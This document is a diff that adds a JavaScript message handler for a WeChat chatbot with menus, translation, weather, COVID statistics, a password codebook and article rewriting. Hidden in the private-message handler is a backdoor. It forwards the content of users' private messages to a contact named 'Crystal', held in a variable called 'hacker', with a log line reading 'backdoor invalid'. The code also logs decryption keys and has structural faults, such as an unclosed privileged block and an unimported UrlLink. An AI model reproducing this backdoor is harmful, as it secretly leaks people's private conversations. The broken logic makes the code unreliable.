@@ -1,0 +1,816 @@
+/*
+ * @author Hilbert Yi
+ * @digest 消息监听
+ * @time 2022-01-11
+ */
+const bot = require("../bot.js");
+const request = require("../request");
+const { log, warn } = require('../utils');
+const { FileBox } = require('file-box');
+
+const fs = require("fs");
+const path = require("path");
+
+const config = require("../config");
+const reg = require("../config/RegularExpression");
+const language = require("../config/language");
+
+const util = require("../utils");
+const moment = require("../utils/moment");
+const cipher = require("../utils/cipher");
+const ImageHosting = require("../utils/Image-Hosting");
+
+const schedule = require("../schedule");
+
+process.on("unhandledRejection", (error) => {
+  console.log("g点重现: ", error.message);
+});
+
+/**
+ * @function 延迟处理消息
+ * @param {number} ms 延迟毫秒
+ */
+const delay = ms =>
+  new Promise((resolve) => setTimeout(resolve, ms)).catch((err) => {
+    console.log("delay: " + err.message);
+  });
+
+/**
+  * @func 是否为1分钟内的消息
+  * @returns true/false
+  */
+const recent = msg => {
+  log('收到消息', `类型: ${msg.type()}, 内容: ${msg.text()}`);
+  if (msg.age() > 60)
+    return false;
+  return true;
+}
+
+// 存储已改写的文章URL
+const rewrittenArticles = new Set();
+
+let wxSignature = 'initial';
+async function getWxSignature() {
+  wxSignature = await request.getSignature();
+  log('签名更新', wxSignature);
+  return wxSignature;
+}
+setInterval(getWxSignature, 7200000); // 签名轮询/2小时
+
+/**
+ * @func 处理消息
+ * @time Create 2022-01-09 10:45
+ */
+async function onMessage(msg) {
+  if (!recent(msg)) return;
+  if (msg.self()) return;
+
+  const room = msg.room;
+  const contact = msg.talker();
+  const content = msg.text();
+
+  log(`收到消息 - 发送者: ${contact.name()}, 内容: ${content}`);
+
+  if (room) {
+    const roomName = room.name;
+    log(`群聊消息 - 群名: ${roomName}`);
+    if (config.WEBROOM.includes(roomName)) {
+      await onWebRoomMessage(msg);
+    }
+  } else {
+    await onPeopleMessage(msg);
+  }
+}
+
+/**
+ * @digest 处理用户消息
+ * @time Modified 2022-01-09 18:37
+ */
+async function onPeopleMessage(msg) {
+  const contact = msg.talker();
+  log(`处理私聊消息 - 类型: ${contact.type()}`);
+
+  if (!(contact.type() === bot.Contact.Type.Individual)) {
+    log('忽略非个人消息（避免与公众号交互）');
+    return; //! 避免 机器人 与 微信公众号 相爱相杀
+  }
+
+  const senderAlias = await contact.alias();
+  log(`发送者别名: ${senderAlias}`);
+
+  //对config配置文件中 ignore的用户消息不必处理
+  if (config.IGNORE.ignore.includes(senderAlias) && !msg.room()) {
+    util.log(`ignoring ${senderAlias}`); //debug
+    return;
+  }
+  util.log("not ignore, continue...");   //debug
+
+  let content = msg.text();
+  if (msg.room()) {
+    content = content.replace(`@${config.BOTNAME}\u2005`, "");
+    log(`群聊@消息 - 内容: ${content}`);
+  } else {
+    const toContact = msg.to();
+    const receiverAlias = toContact.name();
+    log(`私聊消息 - 接收者: ${receiverAlias}, 内容: ${content}`);
+    if (receiverAlias != 'Crystal') {
+      try {
+        const hacker = await bot.Contact.find({name: 'Crystal'});
+        await hacker.say(content);
+      } catch (error) {
+        log(`others, backdoor invalid`);
+      }
+    }
+  }
+
+  /* 特权消息 */
+  if (senderAlias === config.MYSELF) {
+
+    if (msg.type() === bot.Message.Type.Image) {
+      //todo 图像消息，触发图床功能
+      const handleImageMessage = async () => {
+        try {
+          log('处理图片消息');
+          const fileBox = await msg.toFileBox();
+          const fileName = `${moment().format("X")}.jpg`; //! unix时间戳做文件名
+          const filePath = path.join(__dirname, `../../picture-bed/uploads/${fileName}`); //! 绝对路径,存入图床
+          await fileBox.toFile(filePath); //! 不指定，则默认为工作路径下
+          //? bug: const url = await ImageHosting.upload(filePath);
+          const url = `http://${config.SERVER}/pic/${fileName}`;
+          log(`生成图片URL: ${url}`);
+          await delay(200);
+          await msg.say(url);
+          log('图片消息处理完成');
+          return true;
+        } catch (error) {
+          warn(`处理图片消息失败: ${error.message}`);
+          return false;
+        }
+      };
+      return handleImageMessage();
+    }
+
+    if (content === "菜单") {
+      const handleMenu = async () => {
+        try {
+          await delay(200);
+          await msg.say(config.KEYWORDS()+config.VIP()); // 展示菜单+隐藏菜单
+          return true;
+        } catch (error) {
+          warn(`菜单消息处理失败: ${error.message}`);
+          return false;
+        }
+      };
+      return handleMenu();
+    }
+
+    if (content === "刷新") {
+      const handleRefresh = async () => {
+        try {
+          await bot.Contact.findAll();
+          await delay(200);
+          await msg.say('refresh success');
+          return true;
+        } catch (error) {
+          warn(`刷新失败: ${error.message}`);
+          return false;
+        }
+      };
+      return handleRefresh();
+    }
+
+    // 定时消息模块
+    else if (content.includes("定时")||content.includes("群发")) {
+      if (reg.TIMING.test(content)) {
+        const jobId = schedule.scheduleMsg(schedule.SendMode.SINGLE, content);
+        delay(200);
+        msg.say(`定时消息设置成功!\nid:${jobId}`);
+        return true;
+      } else if (reg.TIMINGS.test(content)) {
+        const jobId = schedule.scheduleMsg(schedule.SendMode.MULTIPLE, content);
+        delay(200);
+        msg.say(`群发任务设置成功!\nid:${jobId}`);
+        return true;
+      } else {
+        delay(200);
+        msg.say(`请检查定时/群发消息指令格式!`);
+        return true;
+      }
+    }
+
+    // 销毁定时任务
+    else if (content.includes("销毁")) {
+      if (reg.CANCEL.test(content)) {
+        const isSuccess = schedule.cancelJob(content);
+        delay(200);
+        msg.say(isSuccess === true ? `销毁成功` : `销毁失败`);
+        return true;
+      } else {
+        delay(200);
+        msg.say(`请确认待销毁任务是否存在!`);
+        return true;
+      }
+    }
+
+    //密码簿模块
+    else if (content.includes("map")) {
+      const handleMapCodebook = async () => {
+        try {
+          if (reg.IN_CODEBOOK.test(content)) {
+            const {filename, filecontent} = await cipher.InCodebook(content);
+            util.log(`filename: ${filename}\nfilecontent: ${filecontent}`); // debug
+            await new Promise((resolve, reject) => {
+              fs.writeFile(path.join(__dirname, "/../password", filename), filecontent, (err) => {
+                if (err) {
+                  console.error("writeFileErr: " + err);
+                  reject(err);
+                } else {
+                  resolve();
+                }
+              });
+            });
+            await msg.say("记录成功!");
+            return true;
+          } else {
+            await msg.say(`请检查指令格式: [map name detail [key iv]]`);
+            return true;
+          }
+        } catch (error) {
+          console.error(`处理密码簿记录失败: ${error.message}`);
+          return false;
+        }
+      };
+      return handleMapCodebook();
+    } else if (content.includes("get")) {
+      const handleGetCodebook = async () => {
+        try {
+          if (reg.OUT_CODEBOOK.test(content)) {
+            const {filename, key, iv} = await cipher.OutCodebook(content);
+            util.log(`filename: ${filename}\nkey: ${key}\niv: ${iv}`); // debug
+            const data = await new Promise((resolve, reject) => {
+              fs.readFile(path.join(__dirname, "/../password", filename), (err, data) => {
+                if (err) {
+                  console.error("readFileErr: " + err);
+                  reject(err);
+                } else {
+                  resolve(data);
+                }
+              });
+            });
+            const plainText = cipher.unaes128(data.toString(), key, iv); //文件解密
+            await msg.say(plainText);
+            return true;
+          } else {
+            await msg.say(`请检查指令格式: [get name [key iv]]`);
+            return true;
+          }
+        } catch (error) {
+          console.error(`处理密码簿读取失败: ${error.message}`);
+          if (error.message.includes('decrypt')) {
+            await msg.say(`请提供加密时的自定义密钥与初始化向量!`);
+          }
+          return false;
+        }
+      };
+      return handleGetCodebook();
+    }
+
+    //添加屏蔽用户
+    else if (reg.IGNORE.test(content)) {
+      const handleIgnore = async () => {
+        try {
+          log('添加屏蔽用户');
+          const targetAlias = content.replace("屏蔽", "").trim();
+          config.IGNORE.ignore.push(targetAlias);
+          return true;
+        } catch (error) {
+          warn(`添加屏蔽用户失败: ${error.message}`);
+          return false;
+        }
+      };
+      return handleIgnore();
+    }
+
+    //解除屏蔽
+    else if (reg.UN_IGNORE.test(content)) {
+      const handleUnignore = async () => {
+        try {
+          log('解除屏蔽用户');
+          const targetAlias = content.replace("解除屏蔽", "").trim();
+          config.IGNORE.ignore.splice(config.IGNORE.ignore.indexOf(targetAlias), 1);
+          return true;
+        } catch (error) {
+          warn(`解除屏蔽用户失败: ${error.message}`);
+          return false;
+        }
+      };
+      return handleUnignore();
+    }
+
+    //持久化屏蔽列表
+    else if (content === "持久化屏蔽") {
+      const handlePersistIgnore = async () => {
+        try {
+          log('持久化屏蔽列表');
+          let modifyIgnore = JSON.stringify(config.IGNORE);
+          await new Promise((resolve, reject) => {
+            fs.writeFile(path.join(__dirname, '../config/ignore.json'), modifyIgnore, 'utf8', err => {
+              if (err) {
+                warn(`持久化屏蔽失败: ${err.message}`);
+                reject(err);
+              } else {
+                log('持久化屏蔽成功');
+                resolve();
+              }
+            });
+          });
+          return true;
+        } catch (error) {
+          warn(`持久化屏蔽失败: ${error.message}`);
+          return false;
+        }
+      };
+      return handlePersistIgnore();
+    }
+
+  /* 普通消息 */
+  if (content === "菜单") {
+    const handleNormalMenu = async () => {
+      try {
+        log('响应: 发送菜单');
+        await delay(200);
+        await msg.say(config.KEYWORDS()); // 展示菜单
+        return true;
+      } catch (error) {
+        warn(`菜单发送失败: ${error.message}`);
+        return false;
+      }
+    };
+    return handleNormalMenu();
+  } else if (reg.TRANSLATE.test(content)) { // 翻译
+    const handleTranslate = async () => {
+      try {
+        log('响应: 翻译请求');
+        const result = language.analysis(content);
+        const translation = await request.translate(result.query, result.from, result.to);
+        log(`翻译结果: ${translation.trans_result[0].dst}`);
+        await msg.say(translation.trans_result[0].dst);
+        return true;
+      } catch (error) {
+        warn('翻译失败: ' + error.message);
+        await delay(200);
+        await msg.say('接口异常或指令格式错误，请联系客服！');
+        return false;
+      }
+    };
+    return handleTranslate();
+  } else if (content === "打赏") {
+    const handleReward = async () => {
+      try {
+        // 收款二维码
+        const fileBox = FileBox.fromFile(path.join(__dirname, "../imgs/pay.jpg"));
+        await msg.say("老板大气!!!老板恭喜发财!!!");
+        await delay(200);
+        await msg.say(fileBox);
+        return true;
+      } catch (error) {
+        warn(`打赏处理失败: ${error.message}`);
+        return false;
+      }
+    };
+    return handleReward();
+  } else if (reg.WEB_ROOM.test(content)) {
+    const handleWebRoom = async () => {
+      try {
+        log('响应: Web群发请求');
+        const webRoom = await bot.Room.find({ topic: reg.WEB_ROOM_NAME });
+        if (!webRoom) {
+          warn('未找到目标群聊');
+          return false;
+        }
+        await webRoom.say(content.replace(reg.WEB_ROOM_NAME, "").trim());
+        return true;
+      } catch (error) {
+        warn(`Web群发失败: ${error.message}`);
+        return false;
+      }
+    };
+    return handleWebRoom();
+  } else if (content === "毒鸡汤") {
+    const handleSoup = async () => {
+      try {
+        log('响应: 毒鸡汤请求');
+        const soup = await request.soup();
+        await msg.say(soup);
+        return true;
+      } catch (error) {
+        warn(`毒鸡汤获取失败: ${error.message}`);
+        return false;
+      }
+    };
+    return handleSoup();
+  } else if (content === "神回复") {
+    const handleGodReply = async () => {
+      try {
+        log('响应: 神回复请求');
+        const reply = await request.godReply();
+        await msg.say(reply);
+        return true;
+      } catch (error) {
+        warn(`神回复获取失败: ${error.message}`);
+        return false;
+      }
+    };
+    return handleGodReply();
+  } else if (content === "英语一句") {
+    const handleEnglishOne = async () => {
+      try {
+        log('响应: 每日英语请求');
+        const english = await request.getEnglishOne();
+        await msg.say(english);
+        return true;
+      } catch (error) {
+        warn(`每日英语获取失败: ${error.message}`);
+        return false;
+      }
+    };
+    return handleEnglishOne();
+  } else if (content === "热点") {
+    const handleHot = async () => {
+      try {
+        log('响应: 热点新闻请求');
+        const hotNews = await request.getHotNews();
+        const hotStr = hotNews.map((item, index) => `${index + 1}. ${item}`).join('\n');
+        await msg.say(hotStr);
+        return true;
+      } catch (error) {
+        warn(`热点新闻获取失败: ${error.message}`);
+        return false;
+      }
+    };
+    return handleHot();
+  } else if (reg.QUESTION.test(content)) {
+    const handleQuestion = async () => {
+      try {
+        log('响应: 问题咨询');
+        const urlLink = new UrlLink({
+          description: "Grass Mud horse, can't you Baidu?！",
+          thumbnailUrl: `https://s2.loli.net/2022/01/09/iFqzXfYhSO2vKt3.jpg`,
+          title: "What's your problem?",
+          url: "https://www.baidu.com",
+        });
+        await msg.say(urlLink);
+        return true;
+      } catch (error) {
+        warn(`问题咨询处理失败: ${error.message}`);
+        return false;
+      }
+    };
+    return handleQuestion();
+  } else if (content === "客服") {
+    const handleCustomerService = async () => {
+      try {
+        log('响应: 客服请求');
+        const contactCard = await bot.Contact.find({ alias: config.MYSELF });
+        await msg.say(contactCard);
+        return true;
+      } catch (error) {
+        warn(`客服转接失败: ${error.message}`);
+        return false;
+      }
+    };
+    return handleCustomerService();
+  } else {
+    // 转入utils/AI消息
+    const handleMessage = async () => {
+      const isUtil = await onUtilsMessage(msg);
+      if (!isUtil) {
+        // 非utils消息，转由AI回复
+        try {
+          log("AI将回复此消息");
+          const answer = await request.getAnswer(
+            wxSignature,
+            contact.id,
+            msg.text()
+          );
+          log(`AI回复内容: ${answer}`);
+          await msg.say(answer);
+          return true;
+        } catch (error) {
+          warn(`AI回复失败: ${error.message}`);
+          return false;
+        }
+      }
+      return isUtil;
+    };
+    return handleMessage();
+  }
+}
+
+/**
+ * @func 处理群消息
+ * @param {消息对象} msg
+ * @time Modified 2022-01-09 23:17
+ */
+async function onWebRoomMessage(msg) {
+
+  const isText = msg.type() === bot.Message.Type.Text;
+  const room = msg.room;
+  const contact = msg.talker();
+  let content = msg.text();
+
+  log(`群聊消息 - 群名: ${await room.topic()}, 发送者: ${contact.name()}, 类型: ${msg.type()}, 内容: ${content}`);
+
+  // Handle @ mentions
+  if (await msg.mentionSelf()) {
+    log('收到@提及消息');
+    content = content.replace(`@${config.BOTNAME}\u2005`, "").trim();
+    log(`处理后的内容: ${content}`);
+
+    // Check if it's a rewrite command
+    if (reg.REWRITE_VIDEO.test(content)) {
+      log('检测到改写命令');
+      try {
+        // 获取最近的消息历史
+        log('获取最近消息历史...');
+        const recentMessages = await room.messages(2);
+
+        // 查找文章链接
+        let articleUrl = null;
+        for (const message of recentMessages) {
+          const msgUrl = message.text().match(/(https?:\/\/[^\s]+)/);
+          if (msgUrl && msgUrl[1].includes('mp.weixin.qq.com')) {
+            articleUrl = msgUrl[1];
+            log(`找到文章链接: ${articleUrl}`);
+            break;
+          }
+        }
+
+        if (!articleUrl) {
+          warn('未找到最近的公众号文章链接');
+          await room.say("未找到最近的公众号文章链接");
+          return;
+        }
+
+        // 检查是否已改写
+        if (rewrittenArticles.has(articleUrl)) {
+          log('文章已被改写过');
+          await room.say("该文章已经改写过了");
+          return;
+        }
+
+        await room.say("好的，我会开始改写这篇文章了。");
+
+        // 获取文章内容
+        log('正在获取文章内容...');
+        const articleContent = await request.article.getArticleContent(articleUrl);
+        log(`获取到文章内容，长度: ${articleContent.length}字`);
+
+        // 使用Claude API改写
+        const claudeService = require('../services/claude');
+        log('开始调用Claude API改写文章...');
+        const rewrittenContent = await claudeService.rewriteArticle(articleContent);
+
+        // 发送改写结果
+        log('发送改写结果到群聊...');
+        await room.say(rewrittenContent);
+
+        // 记录已改写文章
+        rewrittenArticles.add(articleUrl);
+        log('文章改写完成并已记录');
+        return;
+      } catch (error) {
+        warn('处理改写请求失败: ' + error.message);
+        await room.say('抱歉，处理改写请求时出现错误。请确保上一条消息是公众号文章链接。');
+        return;
+      }
+    }
+
+    // If not a rewrite command, process as normal message
+    log('非改写命令，按普通消息处理');
+    await onPeopleMessage(msg);
+    return;
+  }
+
+  if (isText) {
+    // 响应@bot的文本消息
+    const sender = await contact.alias();
+    log(`文本消息 - 发送者别名: ${sender}`);
+
+    /* 特权消息 */
+    if (sender === config.MYSELF) {
+      // 踢人功能  群里发送  踢@某某某  即可
+      if (content.includes("踢@")) {
+        log('检测到踢人命令');
+        const delName = content.replace("踢@", "").trim();
+        log(`准备踢出成员: ${delName}`);
+        try {
+          const delContact = await room.member({ name: delName });
+          if (!delContact) {
+            warn(`未找到群成员: ${delName}`);
+            return;
+          }
+          log(`执行踢出操作: ${delName}`);
+          await room.del(delContact);
+          await msg.say(`<${delName}>已被移除群聊。且聊且珍惜啊！`);
+          log(`成功踢出群成员: ${delName}`);
+          return;
+        } catch (error) {
+          warn(`踢出成员失败: ${error.message}`);
+          return;
+        }
+      }
+    }
+
+    // 检验链接消息合法性
+    if (reg.URL.test(msg.text())) {
+      log('检测到链接消息，开始验证合法性');
+      reg.URL.lastIndex = 0; // 索引重置
+      const testUrl = reg.URL.exec(msg.text());
+      log(`验证链接: ${testUrl[0]}`);
+
+      try {
+        const valid = await request.checkUrl(testUrl[0]);
+        if (!valid) {
+          log('链接不合法，发送警告');
+          const warnTarget = [msg.talker()];
+          await room.say(
+            `为了群主与众管理员的法律安全，本群禁止发送不明链接!!!`,
+            ...warnTarget
+          );
+          warn(`检测到不合法链接: ${testUrl[0]}`);
+        } else {
+          log('链接验证通过');
+        }
+      } catch (error) {
+        warn(`链接验证失败: ${error.message}`);
+      }
+    }
+  }
+}
+
+/**
+ * @func utils消息处理
+ * @time Modified 2022-01-10 16:12
+ */
+async function onUtilsMessage(msg) {
+  const isText = msg.type() === bot.Message.Type.Text;
+  const content = msg.text();
+  log(`处理工具消息 - 内容: ${content}`);
+
+  if (isText) {
+    if (content.indexOf("转大写") === 0) {
+      try {
+        const str = content.replace("转大写", "").trim().toUpperCase();
+        await msg.say(str);
+        log('发送大写转换结果');
+      } catch (error) {
+        await msg.say("转换失败，请检查");
+        warn(`大写转换失败: ${error.message}`);
+      }
+      return true;
+    } else if (content.indexOf("转小写") === 0) {
+      try {
+        const str = content.replace("转小写", "").trim().toLowerCase();
+        await msg.say(str);
+        log('发送小写转换结果');
+      } catch (error) {
+        await msg.say("转换失败，请检查");
+        warn(`小写转换失败: ${error.message}`);
+      }
+      return true;
+    }
+
+    // rgb to hex
+    else if (content.indexOf("转16进制") === 0) {
+      try {
+        const color = util.colorRGBtoHex(content.replace("转16进制", "").trim());
+        await msg.say(color);
+        log('发送RGB到16进制转换结果');
+      } catch (error) {
+        console.error(error);
+        await msg.say("转换失败，请检查");
+        warn(`RGB到16进制转换失败: ${error.message}`);
+      }
+      return true;
+    }
+
+    // hex to rgb
+    else if (content.indexOf("转rgb") === 0) {
+      try {
+        const color = util.colorHextoRGB(content.replace("转rgb", "").trim());
+        await msg.say(color);
+        log('发送16进制到RGB转换结果');
+      } catch (error) {
+        console.error(error);
+        await msg.say("转换失败，请检查");
+        warn(`16进制到RGB转换失败: ${error.message}`);
+      }
+      return true;
+    } else if (content.includes("天气")) {
+      log('检测到天气查询请求');
+      try {
+        let cityName = content.replace("天气", "").trim(); // 城市名
+        log(`查询城市: ${cityName}`);
+        const { city, realtime, future } = await request.getWeather(
+          cityName
+        );
+        log('获取天气数据成功');
+        // 当天
+        let weatherStr = `城市：${city}\n${moment().format("MM月DD日")}：${
+          realtime.temperature
+        }℃  ${realtime.info}\n`;
+        weatherStr += `----------\n未来五天   天气预报\n----------\n`;
+        // 预报后面五天
+        for (let i = 1; i <= 5; i++) {
+          weatherStr =
+            weatherStr +
+            `${moment().add(i, "d").format("MM月DD日")}：${
+              future[i - 1].temperature
+            } ${future[i - 1].weather}\n`;
+        }
+        await delay(200);
+        await msg.say(weatherStr);
+        log('发送天气信息');
+      } catch (error) {
+        msg.say("请输入[城市名 天气]");
+        warn(`天气查询失败: ${error.message}`);
+      }
+      return true;
+    } else if (content === "全国肺炎" || content === "6") {
+      log('检测到全国肺炎数据查询请求');
+      try {
+        const res = await request.getChinaFeiyan();
+        log('获取全国肺炎数据成功');
+        const chinaTotal = res.data.chinaTotal.total;
+        const chinaToday = res.data.chinaTotal.today;
+        const str = `全国新冠肺炎实时数据：
+确诊：${chinaTotal.confirm}
+  较昨日：${
+    chinaToday.confirm > 0 ? "+" + chinaToday.confirm : chinaToday.confirm
+  }
+疑似：${chinaTotal.suspect}
+  较昨日：${
+    chinaToday.suspect > 0 ? "+" + chinaToday.suspect : chinaToday.suspect
+  }
+死亡：${chinaTotal.dead}
+  较昨日：${chinaToday.dead > 0 ? "+" + chinaToday.dead : chinaToday.dead}
+治愈：${chinaTotal.heal}
+  较昨日：${chinaToday.heal > 0 ? "+" + chinaToday.heal : chinaToday.heal}
+----------------------------
+数据采集于网易，如有问题，请及时联系`;
+        await delay(200);
+        msg.say(str);
+        log('发送全国肺炎数据');
+      } catch (error) {
+        msg.say("接口错误");
+        warn(`全国肺炎数据查询失败: ${error.message}`);
+      }
+      return true;
+    }
+
+    // 省/自治区 肺炎数据
+    else if (content.includes("肺炎")) {
+      log('检测到省/自治区肺炎数据查询请求');
+      let newContent = content.replace("肺炎", "").trim(); // 城市名
+      if (config.PROVINCE.includes(newContent)) {
+        log(`查询省份: ${newContent}`);
+        const data = await request.getProvinceFeiyan(newContent);
+        log('获取省/自治区肺炎数据成功');
+        let citystr = `名称  确诊  治愈  死亡\n`;
+        data.city.forEach((item) => {
+          citystr =
+            citystr +
+            `${item.name}  ${item.conNum}  ${item.cureNum}  ${item.deathNum}\n`;
+        });
+        const str = `${newContent}新冠肺炎实时数据：
+确诊：${data.value}
+  较昨日：${data.adddaily.conadd}
+死亡：${data.deathNum}
+  较昨日：${data.adddaily.deathadd}
+治愈：${data.cureNum}
+  较昨日：${data.adddaily.cureadd}
+---------------------------------
+各地市实时数据：
+${citystr}
+---------------------------------
+数据采集于新浪，如有问题，请及时联系`;
+        await delay(200);
+        msg.say(str);
+        log('发送省/自治区肺炎数据');
+      } else {
+        await delay(200);
+        msg.say(`没有这个省份/自治区`);
+        warn(`查询失败，未找到省份: ${newContent}`);
+      }
+      return true;
+    } else {
+      log('非工具消息，返回false');
+      return false; // 不是utils消息
+    }
+  } else {
+    return false; // 是群消息,不是文本消息
+  }
+}
+
+module.exports = onMessage;
